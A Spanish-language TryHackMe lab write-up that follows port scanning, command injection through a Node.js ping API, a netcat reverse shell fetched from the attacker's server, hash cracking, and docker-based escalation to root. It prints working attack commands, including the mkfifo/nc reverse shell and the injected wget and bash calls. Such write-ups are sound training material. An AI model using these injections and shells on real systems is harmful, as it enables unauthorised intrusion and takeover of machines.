Bienvenidos a otra sala de tryhackme. Escanearemos puertos abieros con nuestra herramienta bien conocida, enumeraremos la maquina e investigaremos como se comportan las API para luego transferirnos nuestro archivo malicioso y obtener una shell interactiva en nuestra maquina atacante. Descubriremos un usuario por mala administracion de datos en el sistema y escalaremos privilegios a usuario root utilizando `docker`

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.25s latency).
Scanned at 2023-07-05 05:35:48 EDT for 30s
Not shown: 65419 closed ports, 112 filtered ports
Reason: 65419 resets and 112 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    syn-ack ttl 63 Node.js Express framework
31331/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo nos muestra 4 puertos abiertos. Navegamos al servidor web para recopilar informacion. Iniciamos gobuster para buscar rutas ocultas en los puertos 8081 y 31331.

```bash
gobuster dir -u http://IPTARGET:8081 -w /Path/Wordlist -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/05 05:56:29 Starting gobuster
=====================================================
/auth (Status: 200)
=====================================================
2023/07/05 05:57:25 Finished
=====================================================

gobuster dir -u http://IPTARGET:31331 -w /PathWordlist -t 100


=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/05 05:56:14 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/favicon.ico (Status: 200)
/images (Status: 301)
/javascript (Status: 301)
/js (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
=====================================================
2023/07/05 05:57:13 Finished
=====================================================


```

# Intrusion

Nos dirigimos a la ruta /js, en **api.js** nos muestra como la funcion se utiliza para comprobar el estado de una API mediante una solicitud GET a una URL específica.

```bash
`http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```

Realizamos una prueba de ping a nuestra maquina atacante en la direccion URL del puerto 8081 para ver si tenemos exito. Si este es el caso, podemos generar una reverse shell dentro de nuestro sistema para poder enumerarlo correctamente.

```bash
#Capturamos trafico ICMP
sudo tcpdump -i tun0 icmp -n -v

# Nos dirigimos a la URL del puerto 8081
http://IPTARGET:8081

#Le indicamos con el parametro /ping?ip= que nos envie 10 paquetes ICMP a nuestra maquina atacante
http://IPTARGET:8081/ping?ip=`ping -c 10 LHOST`
```

Una vez la respuesta fue exitosa, nos transferimos nuestra shell para luego ejecutarla en el sistema con bash.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f" > shell.php

# abrimos servidor http python
python3 -m http.server 8080

# Transferimos el archivo
http://IPTARGET:8081/ping?ip=`wget LHOST:8080/shell.php`

# Nos ponemos en escucha
nc -nvlp LPORT

# Ejecutamos la shell
http://IPTARGET:8081/ping?ip=`bash shell.php`
```

Una vez dentro, upgradeamos nuestra shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

En directorio que estamos **/api** podemos ver una base de datos sqlite. Ejecutamos cat para ver su contenido `cat utech.db.sqlite` y obtenemos dos credenciales que pertenecen a los usuario **admin/r00t**. Usamos crackstation para crackear sus password o puedes utilizar hashcat.

```bash
echo "password" > hash.txt
hashcat -m 0 /Path/Wordlist hash.txt
```

Establecemos una conexion ssh al usuario r00t.

```bash
ssh r00t@IPTARGET
```

# Priv.Escalation

LIstamos los grupos del sistema `id` y podemos escalar privilegios utilizando `docker`

Gtfobins nos indica que podemos escalar privilegios utilizando el siguiente comando:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Al ejecutarlo, nos dira que no hay ningun proceso ejecutandose en modo alpine y nos dara erro. Para corregir esto, tendremos que listar los procesos que se estan ejecutando en docker y luego modificar el proceso en el comando que escribimos anteriormente.

```bash
docker ps -a 


CONTAINERID  IMAGE COMMAND                  CREATED     STATUS       ...
7beaaeecd784 bash  "docker-entrypoint.s…"   4 years ago Exited (130) ... 
696fb9b45ae5 bash  "docker-entrypoint.s…"   4 years ago Exited (127) ...
9811859c4c5c bash  "docker-entrypoint.s…"   4 years ago Exited (127) ...

# Modificamos el comando y cambiamos alpine por bash

docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

